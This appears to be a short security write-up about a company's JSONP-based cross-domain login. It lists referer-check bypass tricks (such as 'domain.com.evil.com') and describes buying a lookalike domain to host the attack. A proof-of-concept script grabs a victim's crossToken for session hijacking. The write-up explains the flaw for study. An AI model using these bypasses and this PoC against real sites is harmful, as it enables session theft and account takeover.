<p>I find that a company implements cross-domain authentication using JSONP and cookies.There is the login flow:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /api/cross/getsign?callback=test HTTP/1.1
Host: portal.domain.com
Referer: http://www.otherdomain.com

HTTP/1.1 200 OK
test(crossToken)
</code></pre></div></div>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /api/cross/getsign HTTP/1.1
Host: www.otherdomain.com

crossToken=[crossToken]

HTTP/1.1 200 OK
set-cookie: session=xxxxxxxxxxxxxxxxxxxxxxx
</code></pre></div></div>
<p>The company prevents the JSONP injection via referer check.</p>

<p>some common referer check  byapss tricks:</p>
<ul>
  <li>notdomian.com</li>
  <li>domain.com.evil.com</li>
  <li>evil.com/domain.com</li>
  <li>send a blank referer</li>
</ul>

<p>Fortunately, I can bypass it using nototherdomain.com. Then  I buy it and host the malicious code there. So, I can steal the victimsâ€™ crossToken and hijack their session.</p>

<p>POC:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script type="text/javascript"&gt;
function test(data) {
    var crossToken = data;
    document.write('crossToken=' + encodeURIComponent(crossToken));
}
&lt;/script&gt;
&lt;script src="http://portal.domain.com/api/cross/getsign?callback=test"&gt;&lt;/script&gt;
</code></pre></div></div>

<p>Further reading:
<a href="https://securitycafe.ro/2017/01/18/practical-jsonp-injection/">Practical JSONP Injection</a></p>

